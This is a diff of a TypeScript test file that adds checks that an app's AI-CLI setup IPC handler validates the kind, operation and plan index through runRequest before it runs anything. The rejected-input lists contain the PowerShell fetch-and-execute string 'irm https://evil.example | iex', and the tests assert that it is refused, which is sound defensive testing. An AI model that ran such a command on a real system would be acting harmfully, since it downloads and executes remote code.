@@ -1,6 +1,8 @@
 /** Harness setup inside the app (spec 051): plans per OS, sign-in output parsing, link allowlist, paste rules. `npm run test:harnesssetup`. No process runs, nothing is installed. */
 import * as assert from 'assert';
-import { OFFICIAL_PAGES, SIGN_IN, allowedSignInUrl, installPlans, lastLines, managersFor, manualCommands, parseSignIn, simFoundFor, simManagers, stripAnsi, updatePlans, validPaste, validPlanIndex } from '../src/shared/harnesssetup';
+import * as fs from 'fs';
+import * as path from 'path';
+import { OFFICIAL_PAGES, SIGN_IN, allowedSignInUrl, installPlans, lastLines, managersFor, manualCommands, parseSignIn, simFoundFor, simManagers, stripAnsi, runRequest, updatePlans, validPaste, validPlanIndex } from '../src/shared/harnesssetup';
 import type { PackageManager } from '../src/shared/harnesssetup';
 import { EventEmitter } from 'events';
 import { HarnessSetup, confirmText, maskOAuth, posixTrusted } from '../src/main/harnesssetup';
@@ -424,6 +426,22 @@ void (async () => {
     // the index whitelist: integers 0-7 only; anything else is refused (it used to fall back to the first plan)
     for (const ok of [0, 1, 7]) assert.strictEqual(validPlanIndex(ok), ok);
     for (const bad of [-1, 8, 1.5, NaN, Infinity, '0', '1', null, undefined, {}, [0], 'official', 'irm https://evil.example | iex', { valueOf: () => 0 }]) assert.strictEqual(validPlanIndex(bad), undefined, 'refused: ' + String(bad));
+    // review on #469: harness:run checks the window's arguments with runRequest, and the handler runs exactly what it returns
+    assert.deepStrictEqual(runRequest('copilot', 'install', 2), { kind: 'copilot', op: 'install', idx: 2 });
+    assert.deepStrictEqual(runRequest('claude', 'update', 0), { kind: 'claude', op: 'update', idx: 0 });
+    assert.deepStrictEqual(runRequest('codex', 'signin', 'anything'), { kind: 'codex', op: 'signin', idx: 0 }, 'sign-in has one fixed command');
+    for (const bad of [-1, 8, 1.5, '1', null, undefined, [0], 'irm https://evil.example | iex']) {
+      assert.strictEqual(runRequest('copilot', 'install', bad), undefined, 'install refuses index ' + String(bad));
+      assert.strictEqual(runRequest('copilot', 'update', bad), undefined, 'update refuses index ' + String(bad));
+    }
+    assert.strictEqual(runRequest('gemini', 'install', 0), undefined, 'unknown kind');
+    assert.strictEqual(runRequest('copilot', 'uninstall', 0), undefined, 'unknown op');
+    {
+      const ipc = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'main', 'ipc', 'harness.ts'), 'utf8');
+      const body = ipc.slice(ipc.indexOf("ipcHandle('harness:run'"), ipc.indexOf("ipcHandle('harness:paste'"));
+      assert.ok(body.length > 0 && /const req = fromApp\(e\) \? runRequest\(kind, op, planIndex\) : undefined;\s*if \(!req\) return/.test(body), 'harness:run checks sender and arguments with runRequest first');
+      assert.deepStrictEqual(body.match(/\bprepare\([^)]*\)/g), ['prepare(req.kind, req.op, req.idx)'], 'harness:run prepares only what runRequest returned');
+    }
     // an index past the found routes is refused by prepare too (nothing spawns)
     let spawned = 0;
     const hs = new HarnessSetup({
